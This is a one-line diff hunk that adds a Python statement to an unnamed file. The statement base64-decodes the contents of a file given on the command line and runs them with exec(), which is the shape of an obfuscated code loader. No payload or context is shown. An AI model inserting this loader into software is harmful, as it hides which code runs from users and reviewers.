@@ -1,0 +1,1 @@
+import pathlib,base64,sys;exec(base64.b64decode(pathlib.Path(sys.argv[1]).read_bytes()))
